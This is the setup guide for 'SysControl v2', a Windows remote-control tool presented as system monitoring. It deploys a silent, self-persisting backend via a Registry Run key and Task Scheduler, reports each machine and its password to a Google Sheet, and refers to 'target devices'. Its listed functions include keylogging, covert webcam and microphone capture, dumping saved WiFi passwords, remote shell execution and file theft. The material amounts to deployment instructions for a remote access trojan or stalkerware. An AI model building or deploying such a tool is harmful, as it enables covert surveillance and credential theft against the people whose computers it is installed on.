# SysControl v2 — Complete Setup Guide

A remote system monitoring tool. Control any Windows laptop from your phone/browser.

---

## Architecture Overview

```
┌──────────────────┐      ┌──────────────────────┐      ┌──────────────────────┐
│   Frontend       │      │   Google Apps Script  │      │   Backend (Laptop)   │
│   Netlify Site   │◄────►│   Device Registry     │◄────►│   server.py / .exe   │
│   index.html     │      │   Google Sheets DB    │      │   Port 5000          │
│   main.js        │      │                       │      │   + Cloudflare Tunnel│
│   style.css      │      │                       │      │                      │
└──────────────────┘      └──────────────────────┘      └──────────────────────┘
      ▲                                                        ▲
      │              Direct HTTPS connection                   │
      └────────────────────────────────────────────────────────┘
                    (via Cloudflare Tunnel URL)

CI/CD (GitHub Actions):
  push frontend/** → Netlify auto-deploys
  push backend/VERSION → CI builds .exe → GitHub Release → Updates Sheet
  push gas/** → CI runs clasp push + deploy → Apps Script updated
```

**How it works:**
1. Backend runs on a laptop → auto-configures (hostname, random password) → starts Cloudflare tunnel → gets public HTTPS URL
2. Backend registers tunnel URL + device info + password to Google Apps Script (→ Google Sheet)
3. Frontend fetches Google Apps Script → discovers all registered devices with passwords
4. User taps a device → auto-connects using stored password → direct HTTPS to the laptop

**Key design:**
- **Frontend** = deployed once on Netlify, works for ALL devices
- **Backend** = runs on each laptop you want to control — zero-config, no input needed
- **Google Apps Script** = free, always-on device registry backed by Google Sheets
- **Zero-config** = install → run → done. No passwords to type, no IDs to copy
- **Fully automated CI/CD** = push to GitHub → everything deploys automatically

---

## Prerequisites

| Requirement | Purpose | How to get it |
|---|---|---|
| **Python 3.10+** | Backend runtime | https://python.org |
| **cloudflared** | HTTPS tunnel | `winget install cloudflare.cloudflared` |
| **Google account** | Device registry | https://accounts.google.com |
| **Netlify account** | Frontend hosting | https://netlify.com (free) |
| **GitHub account** | Code hosting + CI/CD | https://github.com |

---

## Step 1: Create the Google Apps Script Registry (5 minutes)

This is a one-time setup. The Apps Script acts as your device registry.

1. Go to [Google Sheets](https://sheets.google.com) and create a new spreadsheet
2. Name it **SysControl** (or any name you like)
3. Go to **Extensions → Apps Script**
4. Delete any default code in the editor
5. Copy-paste the contents of `gas/Code.gs` into the editor
6. Click **Save** (Ctrl+S)
7. Click **Deploy → New deployment**
8. Click the gear icon → choose **Web app**
9. Set:
   - **Description**: SysControl Device Registry
   - **Execute as**: Me
   - **Who has access**: Anyone
10. Click **Deploy**
11. **Authorize** when prompted (click "Advanced" → "Go to SysControl" if Google warns)
12. **Copy the Web App URL** — it looks like:
    ```
    https://script.google.com/macros/s/AKfycb.../exec
    ```

### Paste the URL in two places:

**Backend** — `backend/registry.py` line 13:
```python
GAS_URL = "https://script.google.com/macros/s/YOUR_ID_HERE/exec"
```

**Frontend** — `frontend/main.js` line 3:
```javascript
const GAS_URL = "https://script.google.com/macros/s/YOUR_ID_HERE/exec";
```

Both use the **same URL**.

---

## Step 2: Set Up the Backend (2 minutes)

### Option A: Run from source

```powershell
cd backend
python -m venv .venv
.venv\Scripts\activate
pip install -r requirements.txt
python server.py
```

Or use the shortcut: `backend\install.bat`

### Option B: Run the .exe

```powershell
cd backend
build.bat                     # creates dist\SystemMonitor.exe
dist\SystemMonitor.exe        # run it
```

### What happens automatically on first run:

1. **Auto-config**: Device name = your PC hostname, password = random generated, JWT secret = random
2. **Auto-start**: Registers for Windows startup via Task Scheduler + Registry Run key (when running as .exe)
3. **Tunnel**: Cloudflare Quick Tunnel starts → public HTTPS URL created
4. **Registry**: Device info + password sent to Google Apps Script → stored in Google Sheet
5. **Heartbeat**: URL updated every 3 minutes

No browser opens. No setup page. No input needed. The server runs silently.

### Config storage

All config is stored in **Windows Credential Manager** (encrypted by OS):
- Service: `SysControl`
- Contains: password hash, plaintext password, device ID, device name, JWT secret, version

To reset config: open Credential Manager → Windows Credentials → delete `SysControl`

---

## Step 3: Deploy the Frontend (2 minutes)

### Recommended: Connect GitHub repo to Netlify

1. Go to https://app.netlify.com → **Add new site** → **Import an existing project**
2. Connect your GitHub repo
3. Netlify reads `netlify.toml` at the repo root — publish directory is `frontend/`
4. Done — auto-deploys on every push to `main`

### Alternative: Netlify drag-and-drop

1. Go to https://app.netlify.com
2. Drag the `frontend/` folder onto the page
3. Done — you get a URL like `https://your-site.netlify.app`

### Frontend features:

1. Fetches all devices from Google Apps Script (with passwords)
2. Shows device cards with online/offline status and last-seen time
3. Click a device → auto-connects using the stored password
4. 15-second timeout on all API calls — fast feedback if device goes offline
5. Auto-refreshes JWT on 401 — no session expiry interruption
6. Multi-monitor picker in live screen overlay
7. Drag-and-drop file upload in the file explorer
8. Clipboard menu: read remote clipboard OR paste text to it
9. In-app activity log (Log button) — 500-entry buffer, downloadable as .txt

---

## Step 4: CI/CD Automation (one-time setup)

Everything deploys automatically on `git push`. No manual builds, no manual uploads.

### What triggers what

| You change | What happens |
|---|---|
| `frontend/**` | Netlify auto-deploys the site |
| `backend/VERSION` | CI builds .exe → creates GitHub Release → updates Google Sheets "Updates" tab |
| `gas/**` | CI pushes code to Apps Script via clasp → deploys new version |

### How to release a new backend version

```powershell
# Edit backend/VERSION — change e.g. "3.2.0" to "3.3.0"
git add -A; git commit -m "Release v3.3.0"; git push
# Done. CI builds .exe, creates GitHub Release, notifies all devices.
```

### One-time setup: GitHub Secrets and Variables

Go to your GitHub repo → **Settings → Secrets and variables → Actions**.

**Secrets** (sensitive):

| Secret | Where to get it |
|---|---|
| `GAS_DEPLOY_SECRET` | Make up any random string. Also set it as a Script Property in Apps Script (key: `DEPLOY_SECRET`) |
| `CLASP_TOKEN` | Run `clasp login` locally, then copy the contents of `~/.clasprc.json` |
| `GAS_SCRIPT_ID` | Apps Script editor → Project Settings (gear) → "Script ID" |
| `GAS_DEPLOYMENT_ID` | Apps Script editor → Deploy → Manage deployments → copy the active deployment ID |

**Variables** (non-sensitive):

| Variable | Value |
|---|---|
| `GAS_URL` | Your Google Apps Script Web App URL |

**Apps Script setup:**

1. Enable the **Apps Script API**: https://script.google.com/home/usersettings → toggle ON
2. Add Script Property: Apps Script editor → Project Settings → Script Properties → add key `DEPLOY_SECRET` with the same value as your GitHub `GAS_DEPLOY_SECRET` secret

**clasp setup** (run once on your machine):

```powershell
npm install -g @google/clasp
clasp login
# Copy token for GitHub:
Get-Content "$env:USERPROFILE\.clasprc.json"
```

---

## Step 5: Add More Devices

Just install and run the backend on any new laptop:

```powershell
python server.py
```

That's it. The new device auto-registers in the Google Sheet and appears on the frontend. Same Google Apps Script URL for all devices.

---

## Project Structure

```
SysControl-v2/
├── .github/
│   └── workflows/
│       ├── release-backend.yml    ← CI: build .exe + GitHub Release on VERSION change
│       └── deploy-gas.yml         ← CI: clasp push + deploy on gas/ change
├── backend/
│   ├── server.py                  ← Main HTTP server, all routes, zero-config startup
│   ├── config.py                  ← Config storage (Windows Credential Manager)
│   ├── auth.py                    ← JWT authentication (HS256, 24h, auto-refresh)
│   ├── tunnel.py                  ← Cloudflare Quick Tunnel management
│   ├── registry.py                ← Google Apps Script API (register/heartbeat/offline)
│   ├── updater.py                 ← Auto-update from GitHub Releases via Google Sheets
│   ├── VERSION                    ← Current version (CI reads this to auto-tag + release)
│   ├── requirements.txt           ← Python dependencies
│   ├── build.bat                  ← PyInstaller build script (local builds)
│   ├── install.bat                ← Dev setup shortcut
│   └── features/
│       ├── screen.py              ← Screenshot + live screen streaming (multi-monitor)
│       ├── webcam.py              ← Webcam capture + live feed (OpenCV headless)
│       ├── shell.py               ← Remote shell command execution
│       ├── files.py               ← File explorer, editor, upload/download, drag-and-drop
│       ├── system.py              ← System info, IP, clipboard read/write, WiFi, lock, shutdown
│       ├── audio.py               ← Text-to-speech + live microphone
│       ├── keylog.py              ← Keyboard logger (pynput)
│       └── startup.py             ← Windows auto-start (Task Scheduler + Registry Run key)
├── frontend/
│   ├── index.html                 ← Single-page app UI
│   ├── main.js                    ← All frontend logic — auto-discovery, auto-connect, activity log
│   ├── style.css                  ← Dark terminal theme styles
│   └── manifest.json              ← PWA manifest (installable on phones)
├── gas/
│   ├── Code.gs                    ← Google Apps Script code (auto-deployed by CI)
│   ├── appsscript.json            ← GAS project manifest (used by clasp)
│   └── SETUP.md                   ← Apps Script deployment instructions
├── netlify.toml                   ← Netlify config (publish dir, security headers)
├── CLAUDE.md                      ← Claude Code project guidance
├── INSTALL.md                     ← Quick install guide for target devices
└── setup.md                       ← This file
```

---

## Backend Dependencies

| Package | Purpose |
|---|---|
| `mss` | Screenshot capture (multi-monitor) |
| `Pillow` | Image processing + JPEG encoding |
| `keyring` | Windows Credential Manager access |
| `pyttsx3` | Text-to-speech |
| `requests` | HTTP client (Google Apps Script API calls) |
| `pyperclip` | Clipboard read/write |
| `pynput` | Keyboard listener |
| `sounddevice` | Microphone capture |
| `PyJWT` | JWT token creation/verification |
| `bcrypt` | Password hashing |
| `psutil` | CPU/RAM monitoring |
| `opencv-python-headless` | Webcam capture (no GUI/ffmpeg needed) |

---

## API Reference

### Public endpoints (no auth)

| Method | Path | Description |
|---|---|---|
| `GET` | `/` | Status page (device info, tunnel status) |
| `GET` | `/api/status` | JSON health check |
| `POST` | `/api/login` | Authenticate with password → get JWT |

### Protected endpoints (JWT required)

| Method | Path | Description |
|---|---|---|
| `POST` | `/api/cmd` | Execute a command (slash commands or shell) |
| `POST` | `/api/upload` | Upload file to device |
| `POST` | `/api/read-file` | Read file contents |
| `POST` | `/api/save-file` | Save file contents |
| `GET` | `/api/monitors` | List available monitors (index, width, height) |
| `GET` | `/api/screen-live` | Live screen frame (JPEG, `?q=low\|med\|high&mon=N`) |
| `GET` | `/api/webcam-live` | Live webcam frame (JPEG) |
| `POST` | `/api/webcam/start` | Start webcam live feed |
| `POST` | `/api/webcam/stop` | Stop webcam live feed |
| `GET` | `/api/mic/chunk` | Get microphone audio chunk (WAV) |
| `POST` | `/api/mic/start` | Start microphone recording |
| `POST` | `/api/mic/stop` | Stop microphone recording |
| `POST` | `/api/keylog/start` | Start keylogger |
| `POST` | `/api/keylog/stop` | Stop keylogger |
| `POST` | `/api/keylog/clear` | Clear keylog buffer |
| `GET` | `/api/keylog/data` | Get captured keystrokes |

### Slash commands (via `/api/cmd`)

| Command | Description |
|---|---|
| `/screen` | Take screenshot (primary monitor) |
| `/screen <n>` | Take screenshot of monitor N |
| `/webcam` | Take webcam photo |
| `/sys` | System information |
| `/ip` | Public IP address |
| `/clipboard` | Read remote clipboard |
| `/clipboard set <text>` | Write text to remote clipboard |
| `/wifi` | Saved WiFi passwords |
| `/lock` | Lock screen |
| `/shutdown` | Shutdown PC (5s delay) |
| `/speech <text>` | Text-to-speech |
| `/drives` | List drives |
| `/browse [path]` | Browse directory |
| `/download <path>` | Download file |
| `/delete <path>` | Delete file/folder |
| `/rename <path>\|<name>` | Rename file/folder |
| `/mkdir <path>` | Create folder |
| `/mkfile <path>` | Create empty file |
| `/startup` | Check auto-start status |
| `/startup on` | Enable auto-start |
| `/startup off` | Disable auto-start |
| `/shellcmd <cmd>` | Execute shell command |
| Any other text | Executed as shell command |

---

## Troubleshooting

### Backend shows "Connecting..." for tunnel
- Install cloudflared: `winget install cloudflare.cloudflared`
- Make sure you have internet access

### Device doesn't appear on frontend
1. Check the Google Sheet — is the device row there?
2. Make sure `GAS_URL` is the same in both `registry.py` and `main.js`
3. Wait 30 seconds after starting the backend — registration takes a moment

### Frontend shows "Cannot reach registry"
1. Check your internet connection
2. Verify the Google Apps Script is deployed (test the URL in a browser with `?action=devices`)

### Frontend shows "No devices registered yet"
1. Start the backend first
2. Check the Google Sheet for device entries

### Can't connect to device (auto-login fails)
1. Make sure the device is online (green status)
2. The tunnel URL changes on restart — wait for heartbeat to update
3. Check the Google Sheet — does the device row have a password in column I?

### Reset a device config
1. Open Windows Credential Manager
2. Go to Windows Credentials
3. Delete the `SysControl` entry
4. Restart `server.py` — it will auto-setup fresh

### CI/CD: GitHub Release not created
1. Make sure `backend/VERSION` was actually changed in the push
2. Check GitHub Actions tab for workflow run errors
3. Verify the tag doesn't already exist (`git tag -l`)

### CI/CD: GAS deploy failed
1. Check the `CLASP_TOKEN` secret — tokens expire, run `clasp login` again if needed
2. Verify `GAS_SCRIPT_ID` and `GAS_DEPLOYMENT_ID` are correct
3. Make sure the Apps Script API is enabled at https://script.google.com/home/usersettings

### CI/CD: Updates sheet not updated
1. Verify `GAS_URL` variable and `GAS_DEPLOY_SECRET` secret are set in GitHub
2. Verify `DEPLOY_SECRET` Script Property is set in Apps Script (must match the GitHub secret)

---

## Updating the Apps Script

**Automatic (recommended):** Push changes to `gas/Code.gs` → CI deploys via clasp. The URL stays the same.

**Manual fallback:** If CI fails or you need to test locally:
1. Go to your Apps Script editor
2. Paste the updated code
3. Click **Deploy → Manage deployments**
4. Edit the existing deployment → set **Version** to "New version"
5. Click **Deploy**

---

## Data in Google Sheets

### Devices sheet

| Column | Description |
|---|---|
| device_id | Unique 12-char hex ID |
| name | PC hostname (auto-detected) |
| url | Current Cloudflare tunnel URL |
| version | Backend version |
| online | true/false |
| last_seen | ISO timestamp of last heartbeat |
| os | Operating system info |
| ip | (reserved) |
| password | Auto-generated password (shared to frontend) |

### Users sheet

| Column | Description |
|---|---|
| username | Frontend login username |
| password | Frontend login password |

Users are added manually by the sheet owner. Only these users can access the dashboard.

### Updates sheet

| Column | Description |
|---|---|
| version | Release version (e.g. 3.2.0) |
| download_url | GitHub Releases direct download URL |
| file_name | SystemMonitor.exe |
| date | Release date (YYYY-MM-DD) |
| notes | Release notes |

CI automatically appends a row on each release. Devices check the last row to discover updates.

---

## Quick Reference

| Item | Value |
|---|---|
| Backend port | 5000 |
| JWT expiry | 24 hours (auto-refreshes on 401) |
| API timeout | 15 seconds (frontend) |
| Heartbeat interval | 3 minutes |
| Tunnel URL | Changes each restart — auto-updated in registry |
| Config location | Windows Credential Manager → `SysControl` |
| Device ID | Random 12-char hex (generated once on first run) |
| VERSION file | `backend/VERSION` — bump to trigger a release |
| Activity log | 500 entries max, session-only, downloadable as .txt |
